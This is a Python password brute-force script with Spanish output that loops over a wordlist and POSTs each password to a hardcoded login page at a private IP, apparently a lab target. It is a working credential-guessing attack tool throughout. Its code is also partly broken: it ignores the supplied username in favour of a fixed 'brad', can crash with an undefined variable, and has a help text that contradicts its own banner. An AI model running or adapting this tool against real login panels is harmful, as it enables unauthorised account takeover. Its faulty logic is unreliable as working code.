import requests
from pwn import *
from termcolor import colored
import argparse
import time
from datetime import datetime


URL = "http://192.168.1.138/secrets/MK67IT044XYGGIIWLGS9.php"

def print_login_slayer():
    ORANGE = "\033[38;5;208m"
    BOLD = "\033[1m"
    RESET = "\033[0m"

    title = r"""
    ██╗      ██████╗  ██████╗ ██╗███╗   ██╗     ███████╗██╗      █████╗ ██╗   ██╗███████╗██████╗
    ██║     ██╔═══██╗██╔════╝ ██║████╗  ██║     ██╔════╝██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗
    ██║     ██║   ██║██║  ███╗██║██╔██╗ ██║     ███████╗██║     ███████║ ╚████╔╝ █████╗  ██████╔╝
    ██║     ██║   ██║██║   ██║██║██║╚██╗██║     ╚════██║██║     ██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗
    ███████╗╚██████╔╝╚██████╔╝██║██║ ╚████║     ███████║███████╗██║  ██║   ██║   ███████╗██║  ██║
    ╚══════╝ ╚═════╝  ╚═════╝ ╚═╝╚═╝  ╚═══╝     ╚══════╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝

       Herramienta desarrollada por 0xSpectral | v1.0 | Utilizar solo en entornos controlads
                        
"""

    print(f"{BOLD}{ORANGE}{title}{RESET}")




def obtain_args():
    parser = argparse.ArgumentParser(
        prog="Brute Forcer", 
        description="Brute Forcer para paneles de login",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
        epilog="No utilizar en entornos controlados"
    )

    parser.add_argument("-u","--user", required=True, help="Usuario a brutear")
    parser.add_argument("-p", "--password", required=True, help="Passwords a utilizar")

    return parser.parse_args()
    
def brute_forcer(user, password):
    p = log.progress(f"Realizando un ataque de fuerza bruta contra: {URL}")
    print("\n")
    time.sleep(5)
    begin = datetime.now()
    contador = 0
    with open(password, "r", encoding="latin-1") as f:
        for password in f:
            password = password.strip()
            data = {
                "user" : "brad",
                "password" : f"{password}"
            }

            r = requests.post(URL, data=data)
            if "Invalid Credentials" not in r.text or r.status_code == 302:
                print(f"[{colored("+","green")}] Contraseña encontrada para el usuario {user}: {colored(f"{password}", "green")}")
                end = datetime.now()
                break
            else:
                print(f"[{colored("-","red")}] Contraseña incorrecta: {colored(password, "red")}")
            contador = contador+1
    total = end - begin
    print("\n")
    print(colored(f"Se han probado un total de {contador} contraseñas", "green"))
    print(colored(f"Tiempo empleado para el ataque {total.total_seconds()} segundo" if total == 1.0 else f"Tiempo empleado para el ataque {total.total_seconds()} segundos" , "green"))


def main():
    print_login_slayer()
    args = obtain_args()
    brute_forcer(args.user, args.password)

if __name__ == '__main__': 
    main()